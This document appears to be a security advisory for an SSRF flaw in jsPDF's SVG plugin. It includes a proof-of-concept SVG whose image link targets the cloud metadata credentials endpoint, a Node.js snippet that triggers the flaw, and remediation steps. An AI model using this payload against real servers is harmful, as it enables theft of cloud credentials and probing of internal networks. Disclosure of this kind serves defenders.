# CVE-2026-25756: Critical SSRF in jsPDF SVG Plugin

## Description
A Critical Server-Side Request Forgery (SSRF) vulnerability was discovered in the `svg.js` plugin of the `jsPDF` library. The vulnerability exists due to the lack of input validation on `xlink:href` attributes within SVG data. When `jsPDF` is executed in a server-side environment (e.g., Node.js), it attempts to fetch and render external resources specified in the SVG, allowing an attacker to coerce the server into making unauthorized requests.

## Impact Analysis
The impact of this SSRF is critical as it breaks the trust boundary between the application and the internal infrastructure.

**Attack Vectors:**
- **Cloud Metadata Exfiltration:** Accessing internal endpoints like `169.254.169.254` to leak AWS/GCP/Azure IAM credentials.
- **Internal Service Mapping:** Probing internal network ports and services (e.g., Redis, database dashboards) that are not exposed to the public internet.
- **Local File Read:** Depending on the environment's URI scheme support, the `file://` protocol could be used to read sensitive system files (e.g., `/etc/passwd`).

## Technical Breakdown
The `svg.js` plugin utilizes `canvg` to process SVG strings. The core issue lies in the uncurated processing of image references:

```javascript
// Vulnerable logic in svg.js
return loadCanvg()
  .then(function(canvg) {
    return canvg.fromString(ctx, svg, options); // Processes malicious xlink:href
  })
```
By injecting a malicious <image> tag, the server-side rendering engine fetches the remote resource and embeds its content (or evidence of its existence) into the generated PDF.
## proof of Concept 
Malicious SVG Payload:
```XML
<svg width="500" height="500" xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" xmlns:xlink="[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink)">
  <image xlink:href="[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)" width="500" height="500" />
</svg>
```
## Execution Example:
```JavaScript
const { jsPDF } = require('jspdf');
const doc = new jsPDF();
const maliciousSvg = `...payload above...`;

doc.addSvgAsImage(maliciousSvg, 0, 0, 100, 100).then(() => {
    doc.save("leaked_data.pdf");
});
Remediation
Update: Upgrade jsPDF to version >= 4.1.1.

Mitigation: Implement a strict Allow-list for URL schemes and domains in the SVG processing logic. Disable external resource loading if not explicitly required.
```
### Researcher: ZeroXJacks 
Severity: `Critical` (9.8)